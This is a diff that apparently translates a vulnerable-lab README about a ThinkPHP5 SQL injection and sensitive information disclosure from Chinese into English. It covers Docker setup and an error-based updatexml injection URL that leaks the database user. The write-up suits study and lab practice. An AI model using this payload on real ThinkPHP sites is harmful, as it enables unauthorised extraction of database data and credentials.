@@ -1,30 +1,32 @@
-# ThinkPHP5 SQL注入漏洞 && 敏感信息泄露
+# ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability
 
-运行环境：
+[中文版本(Chinese version)](README.zh-cn.md)
 
-```
-docker-compose up -d
-```
+## Rationale
 
-启动后，访问`http://your-ip/index.php?ids[]=1&ids[]=2`，即可看到用户名被显示了出来，说明环境运行成功。
-
-## 漏洞原理
-
-漏洞原理说明：
+Details to read the references：
 
 - https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html
-- https://xianzhi.aliyun.com/forum/read/1813.html
+- https://xz.aliyun.com/t/125
 
-不再赘述。
+## Environment Setup
 
-## 漏洞利用
+Enter the following command:
 
-访问`http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，信息成功被爆出：
+```
+docker compose up -d
+```
+
+Visiting `http://your-ip/index.php?ids[]=1&ids[]=2`, you'll see the username is displayed, indicating that the environment is running successfully.
+
+## Exploit
+
+Open the page `http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，you will find messages revealed successfully：
 
 ![](01.png)
 
-当然，这是一个比较鸡肋的SQL注入漏洞。但通过DEBUG页面，我们找到了数据库的账号、密码：
+And you can find the account and password of the database through the debug page.
 
 ![](02.png)
 
-这又属于一个敏感信息泄露漏洞。
+This is another sensitive information disclosure vulnerability.
